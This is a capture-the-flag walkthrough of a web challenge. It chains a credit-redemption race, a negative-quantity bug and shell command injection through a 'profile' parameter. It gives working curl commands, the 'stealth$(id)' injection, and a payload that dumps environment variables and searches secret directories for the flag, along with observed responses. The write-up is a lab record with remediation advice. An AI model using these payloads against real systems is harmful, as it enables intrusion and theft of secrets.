# DefCamp Supply Drop — Web CTF Walkthrough

**Challenge:** DefCamp Supply Drop  
**Category:** Web exploitation  
**Difficulty:** Multi-step exploit chain  
**Vulnerabilities:** Race condition in credit redemption, negative-quantity ETA manipulation, OS command injection  
**Challenge instance solved:** `http://35.242.204.191:32160` (ephemeral; may no longer be running)  
**Source provided:** `public.zip`  
**Outcome:** Flag retrieved and submitted successfully.

## TL;DR

The shop gave new sessions only 2 credits, while the restricted `Zero-Day Debugger` cost 20. Concurrent `POST /redeem` requests using the same session cookie yielded 10 successful claims, increasing the balance to 20. The premium checkout exposed a `profile` parameter that was interpolated into a shell command with `shell=True`. Passing `profile=stealth$(...)` executed shell command substitution before the verifier's allowlist check. A negative `quantity` did **not** reduce the charged price, but produced a negative ETA and immediate processing. We combined the three behaviors to extract the flag from the command's output in the checkout JSON.

**Successful chain:** `POST /redeem` race → balance `20` → `POST /checkout` for `zero_day_debugger` with `quantity=-99` → shell command substitution inside `profile` → flag in JSON `result`.

## 1. Reconnaissance and source review

The supplied ZIP contains `README.md`, `source/profile_check.py`, `source/verify_profile.py`, an HTML template, and static assets. **The complete remote Flask backend is not supplied.** Consequently, endpoint behavior such as the redemption race and the ETA formula was established from live testing, not backend source inspection.

To inspect the relevant code:

```bash
unzip -l public.zip
unzip -p public.zip source/profile_check.py
unzip -p public.zip source/verify_profile.py
unzip -p public.zip source/templates/index.html | less
```

In `source/profile_check.py`:

```python
def verify_custom_profile(profile: str) -> str:
    command = f'python3 verify_profile.py "{profile}"'
    completed = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=5,
    )
    return (completed.stdout + completed.stderr).strip()
```

In `source/verify_profile.py`, the verifier checks a fixed allowlist (`standard`, `stealth`, `audit`, `sandbox`, `forensics`, `wireless`, `bluetooth`, `firmware`) and prints either `profile accepted:` or `profile rejected:`. The allowlist is **too late** to stop shell metacharacters: the OS shell expands them before `verify_profile.py` receives the argument.

The HTML template showed a `POST /redeem` form, a `POST /checkout` form, and custom `profile` selection only on premium products. Catalog inspection identified:

| Product | `item_id` | Price |
| --- | --- | ---: |
| Terminal Badge | `terminal_badge` | 1 credit |
| Zero-Day Debugger | `zero_day_debugger` | 20 credits |

The default credit claim grants only 2 credits, apparently once per day. The application also displays a 30-minute session timer.

## 2. Establish a clean session

The following **Kali commands are all single-line** (no shell line-continuation backslashes). They use a Firefox User-Agent and cookie jar. Use a new URL if the CTF platform starts a new instance. Each attempt gets new file names; no cleanup/deletion command is needed.

```bash
U='http://35.242.204.191:32160'; UA='Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'; T=$(date +%s); J="defcamp_${T}.cookies"; D="/tmp/defcamp_${T}"; mkdir -p "$D"
```

```bash
curl -sS --connect-timeout 3 --max-time 8 -A "$UA" -c "$J" "$U/" -o "$D/index.html" -w 'HTTP %{http_code} | %{time_total}s\n'
```

```bash
grep -E 'AI Detected|class="balance"' "$D/index.html"
```

A normal homepage response is a prerequisite for the race. The `AI Detected` page was observed during some earlier testing, but the full detection logic was not in the supplied files; we cannot attribute its trigger to any single property with certainty.

## 3. Exploit the credit-claim race

Send 10 simultaneous redemption requests while reusing the **same** session cookie, each saving its result to a different file:

```bash
seq 1 10 | xargs -P10 -I{} curl -sS --connect-timeout 3 --max-time 8 -A "$UA" -H "Origin: $U" -e "$U/" -b "$J" -X POST "$U/redeem" -o "$D/claim_{}.json"
```

Inspect successful balances:

```bash
grep -hoE '"balance":[0-9]+' "$D"/claim_*.json | sort -t: -k2,2n | tail -10
```

**Observed results:**

```text
"balance":2
"balance":4
"balance":6
"balance":8
"balance":10
"balance":12
"balance":14
"balance":16
"balance":18
"balance":20
```

Verify the authoritative balance in the actual session:

```bash
curl -sS --connect-timeout 3 --max-time 8 -A "$UA" -b "$J" "$U/" | grep -A3 'class="balance"'
```

**Observed:**

```html
<div class="balance">
  <span>Credits</span>
  <strong>¢20</strong>
</div>
```

The repeated successful redemptions in one session demonstrate a concurrency-related flaw in enforcing the once-per-day claim. A non-atomic check/update is one plausible implementation mistake, but we did not have the `/redeem` backend source to confirm the exact database or locking mechanism. Ten successes are not guaranteed on every run.

## 4. Understand the negative-quantity behavior

Early testing with `terminal_badge` used `quantity=-99` and returned:

```json
{"balance":1,"cost":1,"eta":-1148,"ok":true,"order_id":"0ae77424b1ff","result":"profile accepted:standard","status":"done"}
```

Thus `quantity=-99` **did not** generate credits or decrease the charged price: it still cost 1 credit. Instead, it caused the returned ETA to be negative, and the checkout completed synchronously (`status: done`) rather than remaining queued (`status: queued`, `result: null`). In the supplied template, the browser's cost display also uses `Math.max(units, 1)` when estimating billable units. The actual backend ETA formula is not available, so the exact arithmetic behind `eta` remains unverified.

This bug is critical to the exploit because otherwise the checkout could remain queued for many minutes instead of returning the command output immediately.

## 5. Verify command execution in the premium checkout

Target URL: `POST /checkout`  
Required form values: `item_id=zero_day_debugger`, `quantity=-99`, and a crafted `profile`.

Proof-of-execution payload:

```text
stealth$(id)
```

Inside the shell command built in `profile_check.py`, this becomes:

```bash
python3 verify_profile.py "stealth$(id)"
```

A POSIX shell performs the `$(id)` substitution even inside double quotes. The verifier then receives something like `stealthuid=1000(ctf) ...`, rejects that altered profile, and echoes it. That rejection itself reveals command output; the injected command already ran.

The proof request we executed was:

```bash
curl -sS -A "$UA" -H "Origin: $U" -e "$U/" -b "$J" -c "$J" -d 'item_id=zero_day_debugger' -d 'quantity=-99' --data-urlencode 'profile=stealth$(id)' "$U/checkout"
```

**Observed result on a previous challenge instance:**

```json
{"balance":0,"cost":20,"eta":-1981,"ok":true,"order_id":"84cdd58eba29","result":"profile rejected:stealthuid=1000(ctf) gid=1000(ctf) groups=1000(ctf)","status":"done"}
```

This confirms remote command execution as the `ctf` user. The purchase consumed 20 credits. On subsequent attempts, we therefore accumulated 20 credits again *before* submitting a new payload.

## 6. Extract the flag (successful final payload)

After establishing a new session and repeating the 10-claim race to reach 20 credits, we ran **one checkout request** with command substitution searching both the environment and several common flag locations:

```bash
curl -sS --connect-timeout 3 --max-time 12 -A "$UA" -H "Origin: $U" -e "$U/" -b "$J" -c "$J" -d 'item_id=zero_day_debugger' -d 'quantity=-99' --data-urlencode 'profile=stealth$( ( printenv; grep -rhE "CTF\{[[:xdigit:]]{64}\}" /flag* /app /home/ctf /tmp /opt /run/secrets 2>/dev/null ) | grep -oE "CTF\{[[:xdigit:]]{64}\}" | head -1)' "$U/checkout"
```

The embedded search does three things:

1. `printenv` reads environment variables, which sometimes hold CTF flags.
2. `grep -rhE ...` searches the specified candidate files/directories for a `CTF{...}` token with 64 hexadecimal characters; errors from missing paths are suppressed.
3. The final `grep -oE ... | head -1` returns only the first matching flag, minimizing the data that gets embedded in the rejected profile string.

**Actual successful response:**

```json
{"balance":0,"cost":20,"eta":-1824,"ok":true,"order_id":"cd715d5b61bb","result":"profile rejected:stealthCTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}","status":"done"}
```

**Flag:**

```text
CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}
```

The flag was successfully submitted. The combined search does **not** prove which specific location contained the flag; pinpointing that would require additional investigation, which was not needed to solve the challenge.

## 7. Root causes and lessons

1. **Race condition / concurrency issue** — Multiple simultaneous `POST /redeem` requests incremented the same session's balance despite the apparent one-claim limit. To prevent this, enforce redemption atomically (for example, with a database uniqueness constraint and transaction), not just with a preceding `if claimed` check.
2. **Quantity-to-ETA validation failure** — Negative quantities were effectively billed as at least one unit, but the negative value still influenced ETA/queue processing. Reject zero and negative quantities on the server and consistently validate the same normalized quantity for price, fulfillment, and scheduling.
3. **OS command injection (critical)** — `subprocess.run(..., shell=True)` combined with untrusted `profile` allowed shell command substitution. Use `subprocess.run([sys.executable, 'verify_profile.py', profile], shell=False, ...)` after validating `profile` against the allowlist; better yet, call the validation function directly without creating a subprocess.
4. **Output disclosure** — The backend returned the verifier's stdout/stderr in the JSON `result`. This turned command execution into immediate data exfiltration over the normal checkout response.
5. **Anti-bot gating is not a fix** — Some requests received an `AI Detected` page, but equivalent race and injection vulnerabilities were still exploitable through ordinary requests. The full detection code was not available, so its specific decision criteria remain unknown.

## Evidence summary

| Stage | Confirmed evidence |
| --- | --- |
| Shop access | `GET /` rendered item catalog and the credit balance |
| Credit race | Concurrent redemptions returned balance increments `2, 4, …, 20` |
| Premium unlock | Homepage showed `¢20` |
| Negative ETA | `quantity=-99` returned `eta < 0`, `status: done` |
| Command execution | `profile=stealth$(id)` yielded `uid=1000(ctf)` |
| Flag retrieval | `result` contained `CTF{00fd1af2...a8f43b5e2}` |

**Final exploit chain:** race the credit claim → purchase premium item → force immediate processing with negative quantity → inject shell command substitution in profile → recover the flag from the checkout response.